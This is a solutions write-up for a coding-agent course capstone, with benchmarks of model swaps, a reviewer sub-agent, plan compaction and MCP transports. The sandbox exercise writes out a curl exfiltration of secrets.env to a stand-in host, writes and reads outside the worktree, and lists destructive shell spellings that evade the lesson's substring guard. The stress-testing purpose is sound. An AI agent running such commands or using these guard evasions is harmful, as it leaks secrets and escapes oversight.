<!-- generated:start -->
# 19-capstone-projects / 01-terminal-native-coding-agent

Solutions to all 5 exercises. Source: [lesson page](https://yennj12.js.org/ai-engineering-from-scratch/phases/19-capstone-projects/01-terminal-native-coding-agent/) · upstream spec
`phases/19-capstone-projects/01-terminal-native-coding-agent/docs/en.md`

```bash
uv run demo practice run 01-terminal-native-coding-agent --ex 1
uv run demo explain 01-terminal-native-coding-agent --ex 1
uv run pytest demos/phases/19-capstone-projects/01-terminal-native-coding-agent
```

Solutions import the lesson's own `code/` rather than copying it, so every check
compares against the reference implementation and not a fork of it (`DESIGN D5`).

| # | Exercise | Kind | Tier | Ships |
|---|---|---|---|---|
| 1 | Swap the backing model from Claude Sonnet 4.7 to Qwen3-Coder-30B served on vLLM. Compare pass… | code | T0 | `ex01_the_harness_scores_both_models_20_of_20_because_failed_tool_calls_never_fail_a_task.py` |
| 2 | Add a `reviewer` sub-agent that reads the diff before PR posting and can request a revision l… | code | T0 | `ex02_a_reviewer_with_8_false_positives_cuts_the_lessons_agent_from_20_to_12_of_30_because_it_cannot_revise.py` |
| 3 | Stress-test the sandbox: write a task that tries to `curl` an external URL and a task that wr… | code | T0 | `ex03_the_shipped_pretooluse_guard_blocks_0_of_3_escapes_and_a_path_aware_hook_blocks_3.py` |
| 4 | Implement `PreCompact` summarization with a smaller model (Haiku 4.5). Measure how much plan… | code | T0 | `ex04_at_3x_a_front_to_back_summary_keeps_3_of_12_plan_items_and_pinning_the_plan_keeps_12.py` |
| 5 | Swap MCP StreamableHTTP transport for stdio. Benchmark cold-start and per-call latency. Pick… | code | T1 | `ex05_stdio_beats_streamablehttp_3x_per_call_and_the_lesson_ships_neither_transport.py` |
<!-- generated:end -->

## Answers

Every exercise runs the lesson's `code/main.py`. It is a stdlib
plan-act-observe loop with a scripted stub model, two tools (`read_file`,
`run_shell`), an eight-event hook bus and a turn/token/dollar budget. Nothing
here calls a model or the internet at run time. Where an exercise names a
model or a GPU server, the solution drives the lesson's own seams
(`model_step`, `TOOLS`, `destructive_guard`, `HookBus`) with labelled
stand-ins, which is the scaled-down run D11 asks for. Prices come from
platform.claude.com/docs/en/about-claude/pricing, read 2026-09-29.

### 1 — the harness scores both models 20/20, because failed tool calls never fail a task

**The open model underperforms on tool-call format, and the lesson's harness
cannot see it.** Twenty "find the FIX-nn token" tasks go through the
`model_step` seam. The open stand-in makes one slip per 4 tasks: clean,
wrong tool name, wrong argument key, absolute path, and never stopping.

| | harness pass@1 (plan all `[x]`) | evidence pass@1 | $/task | runs at the turn cap |
|---|---:|---:|---:|---:|
| frontier stand-in | 20/20 | 20/20 | $0.03 | 0 |
| open stand-in (self-hosted, $0) | 20/20 | 4/20 | $0 | 4 |

The harness catches each malformed call as an exception and logs `ok: False`,
but the plan still says done. The 4 looping runs stop only at the 50-turn cap,
after 60,000 tokens (33.3x a clean run), because a model that reports $0
never reaches the $5 ceiling. The real run is
`vllm serve Qwen/Qwen3-Coder-30B-A3B-Instruct --enable-auto-tool-choice --tool-call-parser qwen3_xml`
behind the same `model_step`.

**The shipped demo already "passes" with a failed read.** `main()` reads
`README.md` from `code/`, which has none. The trace shows `ok: False` and the
plan prints 3/3 `[x]`. **Dollars are the model's self-report.** `Budget.step`
adds whatever `cost` the model returns, and it keeps a single token total
with no input/output split. The script reports $0.05 for 2,700 tokens,
which is $18.52/MTok and above even Sonnet 4.6's $15/MTok output price. The
"Claude Sonnet 4.7" that the exercise names is not on Anthropic's price
list.

### 2 — a reviewer with 8 false positives cuts the lesson's agent from 20/30 to 12/30, because it cannot revise

**Yes, the reviewer drops the lesson's agent below baseline; an ideal
reviser does not drop.** The reviewer reads unified diffs with three rules:
no test edits, no removed asserts, no swallowed exceptions. It runs on 30
labelled diffs, 20 correct and 10 wrong, and gets 3 revision rounds.

| | pass | note |
|---|---:|---|
| single agent, post everything | 20/30 | baseline |
| reviewer + the lesson's `run_agent` | 12/30 | 4 sessions per flagged task |
| reviewer + ideal reviser | 23/30 | 4 correct diffs broken by obeying, 7 wrong ones fixed |

The reviewer flags 8/20 correct diffs: added regression tests, an obsolete
assert dropped, a `KeyError` handled. It flags 7/10 wrong ones. The lesson's
stub returns the same run whatever the review says, so every flag holds for
all 3 rounds. The review loses exactly when obeyed false positives outnumber
fixed true positives. **There is also nothing to review in the lesson's
harness:** `TOOLS` has 2 of the 6 tools the lesson lists, with no `edit_file`
and no `git`. A `Stop` hook that asks for revision is ignored: the run still
ends at 3 turns.

### 3 — the shipped PreToolUse guard blocks 0 of 3 escapes; a path-aware hook blocks 3

**With `sandbox_guard` all three attempts are blocked and logged in the
PostToolUse trace, and 3/3 benign calls still run.** The attempts run in a
temp worktree through `run_agent`. `curl` is a PATH shim that only records
its argv, so nothing leaves the machine.

| attempt | shipped `destructive_guard` | `sandbox_guard` |
|---|---|---|
| `curl -sS https://example.com/exfil -d @secrets.env` | runs | blocked: network egress |
| `echo pwned > ../outside.txt` | file written | blocked: write outside worktree |
| `read_file ../wt_evil/secret.txt` | secret returned | blocked: read outside worktree |

The read escapes because `tool_read_file` tests `startswith` on the raw path,
so `/tmp/x/wt_evil` counts as inside `/tmp/x/wt`. `run_shell` is a host
`subprocess(shell=True)`; the worktree is only its cwd. The guard itself is
a substring match. It blocks 2 of 8 destructive spellings (`rm -rf /`,
`sudo shutdown -h now`) and misses `rm -fr`, `rm -r -f`, `RM -RF`, a double
space, `find -delete` and `git clean -xfd`. It also blocks
`echo shutdown notes`.

### 4 — at 3x, a front-to-back summary keeps 3 of 12 plan items right; pinning the plan keeps 12

**At 3x compaction the loss depends entirely on whether the latest plan
survives.** The test session runs 36 turns with a 12-item plan, and each
turn is `PlanState.summary()` plus one observation. Fidelity is how many
final (id, status) pairs can be read back.

| policy at 3x | plan fidelity | observations kept |
|---|---:|---:|
| `oldest` (single-pass summary that runs out of budget) | 3/12 | early turns only |
| `newest` (sliding window) | 12/12 | last third |
| `pinned` (latest plan as a prior-state block, then newest turns) | 12/12 | 11/36 |

The plan is rewritten whole each turn, so any policy that keeps the last
turn keeps the whole plan; `pinned` holds 12/12 up to 109x. What 3x costs is
history. One Haiku 4.5 pass at the lesson's 150k mark costs $0.40: 150k in
and 50k out at $1/$5 per MTok. On Sonnet 4.6 it costs $1.20. Output is $0.25
of the $0.40, because 3x still leaves 50k tokens to write. **The notes are
lost before compaction:** `summary()` drops `note`, so 0 of 12 notes reach
the transcript. **The harness never compacts:** `PreCompact`,
`UserPromptSubmit` and `Notification` never fire, and `main.py` has no 150k
threshold. Its only ceiling is a 200,000 cumulative total that ends the
session.

### 5 — stdio beats StreamableHTTP about 3x per call, and the lesson ships neither transport

**stdio wins for local-only use.** Both transports serve the lesson's `TOOLS`
as MCP-shaped JSON-RPC from a subprocess. Over 6 runs on the authoring
machine:

| | per-call median | cold start (best of 7) |
|---|---:|---:|
| in-process (what `run_agent` does) | 0.030 ms | — |
| stdio (newline-delimited JSON on a pipe) | 0.047-0.050 ms | 32-33 ms |
| StreamableHTTP-style POST, keep-alive, 127.0.0.1 | 0.135-0.149 ms | 34-35 ms |

All 900 responses are byte-identical across the three paths. Cold start is
mostly the Python interpreter starting; the transport adds 2-3 ms. stdio
also needs no port, and the server dies with the pipe. The checks assert the
orderings, not the numbers, because wall-clock time varies by machine.
**The lesson has no transport to swap:** `main.py` contains no socket,
HTTP or server code and calls `TOOLS[name]` in-process. The "MCP
StreamableHTTP client" in its architecture has no code behind it.
